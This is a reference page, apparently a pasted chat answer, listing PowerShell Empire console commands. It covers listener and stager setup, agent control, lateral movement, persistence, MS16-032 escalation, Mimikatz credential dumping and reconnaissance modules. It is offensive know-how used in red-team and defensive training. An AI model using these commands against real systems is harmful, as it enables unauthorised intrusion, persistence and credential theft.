---
title: powershell-empire_commands
description: powershell-empire_commands
layout: libdoc/page

#LibDoc specific below
category: Commands
order: 214
#unlisted: true
---
* 
{:toc}


# Comprehensive PowerShell Empire Commands

## Listener Management

| **Command**                    | **Description**                                               | **Example**                           |
|--------------------------------|---------------------------------------------------------------|---------------------------------------|
| `listeners`                    | List all active listeners                                     | `listeners`                           |
| `listeners create`             | Create a new listener                                         | `listeners create http`               |
| `listeners options`            | Show options for configuring a listener                       | `listeners options http`              |
| `listeners set <option> <value>` | Set an option for the current listener                      | `listeners set Host http://192.168.1.1` |
| `listeners info <name>`        | Get detailed information about a specific listener            | `listeners info http`                 |
| `listeners kill <name>`        | Stop and remove a specific listener                           | `listeners kill http`                 |
| `listeners kill_all`           | Stop and remove all listeners                                 | `listeners kill_all`                  |

## Stager Management

| **Command**                    | **Description**                                               | **Example**                           |
|--------------------------------|---------------------------------------------------------------|---------------------------------------|
| `usestager <stager>`           | Use a specified stager                                        | `usestager windows/launcher_bat`      |
| `stagers`                      | List all available stagers                                    | `stagers`                             |
| `stager <stager> options`      | Show options for a specific stager                            | `stager windows/launcher_bat options` |
| `set <option> <value>`         | Set an option for the current stager                          | `set Listener http`                   |
| `execute`                      | Generate and execute the stager with the specified options    | `execute`                             |

## Agent Management

| **Command**                    | **Description**                                               | **Example**                           |
|--------------------------------|---------------------------------------------------------------|---------------------------------------|
| `agents`                       | List all active agents                                        | `agents`                              |
| `interact <agent_name>`        | Interact with a specific agent                                | `interact 1A2B3C4D`                   |
| `agents info <agent_name>`     | Get detailed information about a specific agent               | `agents info 1A2B3C4D`                |
| `agents kill <agent_name>`     | Kill a specific agent                                         | `agents kill 1A2B3C4D`                |
| `agents rename <agent_name> <new_name>` | Rename a specific agent                           | `agents rename 1A2B3C4D backup_agent` |
| `agents clear`                 | Clear all agent logs and history                              | `agents clear`                        |

## Module Management

| **Command**                    | **Description**                                               | **Example**                           |
|--------------------------------|---------------------------------------------------------------|---------------------------------------|
| `usemodule <module>`           | Use a specified module                                        | `usemodule powershell/credentials/mimikatz` |
| `modules`                      | List all available modules                                    | `modules`                             |
| `module <module> options`      | Show options for a specific module                            | `module powershell/credentials/mimikatz options` |
| `set <option> <value>`         | Set an option for the current module                          | `set Agent 1A2B3C4D`                  |
| `execute`                      | Execute the module with the specified options                 | `execute`                             |
| `back`                         | Return to the main menu                                       | `back`                                |

## Empire Management

| **Command**                    | **Description**                                               | **Example**                           |
|--------------------------------|---------------------------------------------------------------|---------------------------------------|
| `help`                         | Show the help menu                                            | `help`                                |
| `jobs`                         | List all active jobs                                          | `jobs`                                |
| `killjob <job_id>`             | Kill a specific job                                           | `killjob 2`                           |
| `killjobs`                     | Kill all jobs                                                 | `killjobs`                            |
| `shell <command>`              | Execute a shell command on the local machine                  | `shell ipconfig`                      |
| `reset`                        | Reset the Empire environment                                  | `reset`                               |
| `exit`                         | Exit the Empire framework                                     | `exit`                                |
| `report`                       | Generate a report of the current Empire session               | `report`                              |
| `listeners load <config_file>` | Load listeners from a configuration file                      | `listeners load config.json`          |
| `listeners save <config_file>` | Save listeners to a configuration file                        | `listeners save current_config.json`  |

## Lateral Movement

| **Command**                    | **Description**                                               | **Example**                           |
|--------------------------------|---------------------------------------------------------------|---------------------------------------|
| `usemodule lateral_movement/invoke_wmi` | Use the WMI lateral movement module              | `usemodule lateral_movement/invoke_wmi` |
| `usemodule lateral_movement/invoke_psremoting` | Use the PowerShell remoting lateral movement module | `usemodule lateral_movement/invoke_psremoting` |
| `set <option> <value>`         | Set an option for the lateral movement module                 | `set Listener http`                   |
| `execute`                      | Execute the lateral movement module with the specified options| `execute`                             |

## Exploitation

| **Command**                    | **Description**                                               | **Example**                           |
|--------------------------------|---------------------------------------------------------------|---------------------------------------|
| `usemodule exploit/microsoft/rasman_reg` | Use the RasMan registry exploit                   | `usemodule exploit/microsoft/rasman_reg` |
| `usemodule exploit/microsoft/ms16_032` | Use the MS16-032 exploit                           | `usemodule exploit/microsoft/ms16_032` |
| `set <option> <value>`         | Set an option for the exploit module                          | `set Agent 1A2B3C4D`                  |
| `execute`                      | Execute the exploit with the specified options                | `execute`                             |

## Persistence

| **Command**                    | **Description**                                               | **Example**                           |
|--------------------------------|---------------------------------------------------------------|---------------------------------------|
| `usemodule persistence/elevated/wmi` | Use the WMI persistence module                   | `usemodule persistence/elevated/wmi`  |
| `usemodule persistence/user/registry` | Use the registry persistence module             | `usemodule persistence/user/registry` |
| `set <option> <value>`         | Set an option for the persistence module                      | `set Listener http`                   |
| `execute`                      | Execute the persistence module with the specified options     | `execute`                             |

## Credential Dumping

| **Command**                    | **Description**                                               | **Example**                           |
|--------------------------------|---------------------------------------------------------------|---------------------------------------|
| `usemodule credentials/mimikatz/logonpasswords` | Use the Mimikatz module to dump logon passwords | `usemodule credentials/mimikatz/logonpasswords` |
| `usemodule credentials/powershell/securestring` | Dump secure strings from memory                     | `usemodule credentials/powershell/securestring` |
| `set <option> <value>`         | Set an option for the credential dumping module               | `set Agent 1A2B3C4D`                  |
| `execute`                      | Execute the credential dumping module with the specified options | `execute`                          |

## Network Reconnaissance

| **Command**                    | **Description**                                               | **Example**                           |
|--------------------------------|---------------------------------------------------------------|---------------------------------------|
| `usemodule situational_awareness/network/portscan` | Use the port scanning module                   | `usemodule situational_awareness/network/portscan` |
| `usemodule situational_awareness/network/ping_sweep` | Perform a ping sweep across the network       | `usemodule situational_awareness/network/ping_sweep` |
| `set <option> <value>`         | Set an option for the network reconnaissance module           | `set Agent 1A2B3C4D`                  |
| `execute`                      | Execute the network reconnaissance module with the specified options | `execute`                        |

## System Reconnaissance

| **Command**                    | **Description**                                               | **Example**                           |
|--------------------------------|---------------------------------------------------------------|---------------------------------------|
| `usemodule situational_awareness/host/enum_users` | Enumerate user accounts on the target            | `usemodule situational_awareness/host/enum_users` |
| `usemodule situational_awareness/host/enum_shares` | Enumerate shared folders on the target         | `usemodule situational_awareness/host/enum_shares` |
| `set <option> <value>`         | Set an option for the system reconnaissance module             | `set Agent 1A2B3C4D`                  |
| `execute`                      | Execute the system reconnaissance module with the specified options | `execute`                        |

```

This list provides a broad overview of commands for PowerShell Empire, including listener management, stager and agent handling, modules for various purposes, and other essential operations. Each command is paired with a brief description and a practical example to illustrate its use. If you need more specific details or further explanations on any of these commands, feel free to ask!
